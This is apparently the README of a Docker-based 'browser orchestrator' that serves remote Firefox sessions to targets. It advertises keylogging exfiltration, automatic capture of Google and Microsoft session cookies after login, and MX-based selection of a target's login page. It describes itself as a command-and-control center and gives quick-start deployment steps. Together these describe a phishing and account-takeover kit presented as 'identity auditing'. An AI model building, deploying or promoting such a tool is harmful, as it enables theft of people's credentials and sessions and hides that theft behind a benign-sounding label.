# Browser Launch Orchestrator (BLO)

A professional, Docker-based control plane for orchestrating isolated browser instances with advanced session auditing, keylogging, and identity exfiltration capabilities.

## Architecture & Features

This application acts as a "Command & Control" center for a fleet of remote Firefox containers.

- **🚢 Isolated Fleet**: Spawns independent `jlesage/firefox` containers for every user session.
- **🛡️ Secure Network**: Integrated Software Defined Firewall using the `iptables` `DOCKER-USER` chain to restrict access.
- **🕵️ Session Auditor**: Real-time keylogging exfiltration from the remote browser back to the orchestrator.
- **🔐 Identity Vault**: Automatically captures and syncs session-critical cookies (Google, Microsoft, Outlook, etc.) after successful logins.
- **🌐 Smart Routing**: Automatic login URL determination via MX record lookups for target email domains.
- **📊 Live Monitoring**: Dynamic resource utilization tracking (CPU, Memory, Uptime) for active instances.

## Prerequisites

- **Docker & Docker Compose**: Installed and running on the host system.
- **Linux Host**: Required for the `iptables` firewall functionality.
- **Node.js 20+**: If running the orchestrator outside of Docker for development.

## Quick Start (Docker Compose)

The easiest way to deploy the entire stack is using Docker Compose.

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd browser-orchestrator
   ```

2. **Start the Orchestrator**:
   ```bash
   docker-compose up --build -d
   ```

3. **Access the Web UI**:
   Open [http://localhost:3000](http://localhost:3000) in your browser.

## Manual Setup

### 1. Install Dependencies
```bash
npm install
```

### 2. Build Frontend
```bash
npm run build
```

### 3. Run the Server
```bash
# Development
npm run dev

# Production
npm start
```

## Security Configurations

### Firewall (iptables)
The application manages the `DOCKER-USER` chain. To ensure this works correctly:
1. Run the orchestrator with sufficient privileges to execute `iptables` (e.g., `sudo` or as `root` in the container).
2. Ensure your kernel supports the `iptables` module.

### Browser Extension
The custom extension is located in the `/extension` directory. It is automatically mounted into every browser container spawned by the orchestrator.

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `PORT` | The port the orchestrator listens on | `3000` |
| `NODE_ENV` | Environment mode (`development`/`production`) | `development` |
| `DOCKER_BROWSER_IMAGE` | The Firefox image to use | `jlesage/firefox:latest` |

## Deployment Checklist

- [ ] Host server has Docker Engine installed.
- [ ] Port 3000 is open in the hardware firewall.
- [ ] Docker Socket is reachable at `/var/run/docker.sock`.
- [ ] Extension source path is correctly configured in `server.ts`.

---
*Developed for advanced browser orchestration and identity auditing.*
